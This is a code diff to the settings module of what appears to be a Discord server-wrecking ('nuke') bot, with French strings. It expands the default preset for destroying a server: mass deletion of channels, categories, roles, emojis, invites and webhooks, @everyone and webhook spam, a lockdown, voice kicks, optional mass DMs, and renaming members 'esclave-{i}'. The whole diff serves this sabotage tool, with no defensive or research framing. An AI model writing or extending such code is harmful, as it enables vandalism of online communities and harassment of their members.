@@ -31,31 +31,52 @@ DEFAULT_PRESET: dict[str, Any] = {
     "rename_server": True,
     "server_name": "☠️ SERVEUR DÉTRUIT ☠️",
     "announce": True,
+    "lockdown": True,
     "spam": True,
-    "spam_count": 5,
+    "spam_count": 10,
     "spam_message": "@everyone 💀 **ce serveur a été détruit.**",
     "rename_channels": True,
     "rename_pattern": "💀-{name}",
     "create_channels": True,
-    "create_count": 10,
+    "create_count": 12,
     "create_pattern": "salon-{i}",
     "create_voice": True,
-    "create_voice_count": 3,
+    "create_voice_count": 4,
     "create_voice_pattern": "vocal-{i}",
+    "create_threads": True,
+    "create_threads_count": 6,
+    "create_threads_pattern": "fil-{i}",
     "delete_channels": True,
-    "keep_channel": False,
+    "keep_channel": True,
+    "delete_categories": True,
     "delete_roles": True,
+    "rename_roles": True,
+    "rename_roles_pattern": "💀 {name}",
     "create_roles": True,
-    "create_roles_count": 5,
+    "create_roles_count": 6,
     "create_roles_pattern": "role-{i}",
     "delete_emojis": True,
     "delete_stickers": True,
     "delete_invites": True,
     "delete_webhooks": True,
+    "webhook_spam": True,
+    "webhook_spam_count": 3,
+    "webhook_spam_message": "☠️ @everyone le serveur est détruit ☠️",
+    "invite_spam": True,
+    "invite_spam_count": 2,
+    "rename_members": False,
+    "rename_members_pattern": "esclave-{i}",
+    "timeout_members": False,
+    "timeout_minutes": 60,
+    "voice_kick": True,
+    "mass_dm": False,
+    "mass_dm_message": "💀 Le serveur a été détruit. Bonne chance.",
     "ban_members": False,
     "kick_members": False,
     "exclude_bots": True,
-    "workers": 4,
+    "final_message": True,
+    "final_message_text": "☠️ **DESTRUCTION TERMINÉE** — il ne reste rien.",
+    "workers": 6,
     "delay_ms": 0,
 }
 
@@ -63,29 +84,45 @@ _INT_KEYS = {
     "spam_count",
     "create_count",
     "create_voice_count",
+    "create_threads_count",
     "create_roles_count",
+    "webhook_spam_count",
+    "invite_spam_count",
+    "timeout_minutes",
     "workers",
     "delay_ms",
 }
 _BOOL_KEYS = {
     "rename_server",
     "announce",
+    "lockdown",
     "spam",
     "rename_channels",
     "create_channels",
     "create_voice",
+    "create_threads",
     "delete_channels",
     "keep_channel",
+    "delete_categories",
     "delete_roles",
+    "rename_roles",
     "create_roles",
     "delete_emojis",
     "delete_stickers",
     "delete_invites",
     "delete_webhooks",
+    "webhook_spam",
+    "invite_spam",
+    "rename_members",
+    "timeout_members",
+    "voice_kick",
+    "mass_dm",
     "ban_members",
     "kick_members",
     "exclude_bots",
+    "final_message",
 }
+_TEXT_SUFFIXES = ("_pattern", "_name", "_message", "_text")
 
 
 def _connect() -> sqlite3.Connection:
@@ -110,6 +147,8 @@ def init() -> None:
             set_setting("secret_code", secrets.token_urlsafe(9))
         if get_setting("preset") is None:
             set_setting("preset", json.dumps(DEFAULT_PRESET, ensure_ascii=False))
+        if get_setting("default_mode") is None:
+            set_setting("default_mode", "custom")
 
 
 def get_setting(key: str, default: str | None = None) -> str | None:
@@ -137,6 +176,14 @@ def get_secret_code() -> str:
 
 def set_secret_code(code: str) -> None:
     set_setting("secret_code", code.strip())
+
+
+def get_default_mode() -> str:
+    return get_setting("default_mode") or "custom"
+
+
+def set_default_mode(mode: str) -> None:
+    set_setting("default_mode", mode or "custom")
 
 
 def get_guild_id() -> int | None:
@@ -181,9 +228,8 @@ def save_preset(data: dict[str, Any]) -> dict[str, Any]:
                 current[key] = max(0, int(value))
             else:
                 text = str(value)
-                if key.endswith("_pattern") or key.endswith("_name") or key.endswith("_message"):
-                    if text.strip() == "":
-                        text = str(default)
+                if key.endswith(_TEXT_SUFFIXES) and text.strip() == "":
+                    text = str(default)
                 current[key] = text[:2000]
         except (TypeError, ValueError):
             continue
